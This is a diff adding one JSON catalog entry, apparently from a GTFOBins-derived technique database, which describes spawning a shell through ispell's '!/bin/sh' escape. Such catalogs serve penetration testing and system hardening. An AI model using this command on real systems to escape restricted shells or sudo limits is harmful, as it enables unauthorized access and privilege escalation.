@@ -1,0 +1,23 @@
+{
+  "id": "gtfo-ispell-shell",
+  "name": "GTFOBins · ispell (shell)",
+  "command": "ispell /etc/hosts\n!/bin/sh",
+  "description": "Use ispell to shell via GTFOBins.",
+  "platform": "linux",
+  "tags": [
+    "gtfobins",
+    "ispell",
+    "shell"
+  ],
+  "source": "gtfobins",
+  "source_url": "https://gtfobins.github.io/gtfobins/ispell/#shell",
+  "upstream_id": "ispell/shell/0",
+  "category": "gtfobins",
+  "subcategory": "shell",
+  "references": [
+    {
+      "title": "GTFOBins",
+      "url": "https://gtfobins.github.io/gtfobins/ispell/"
+    }
+  ]
+}
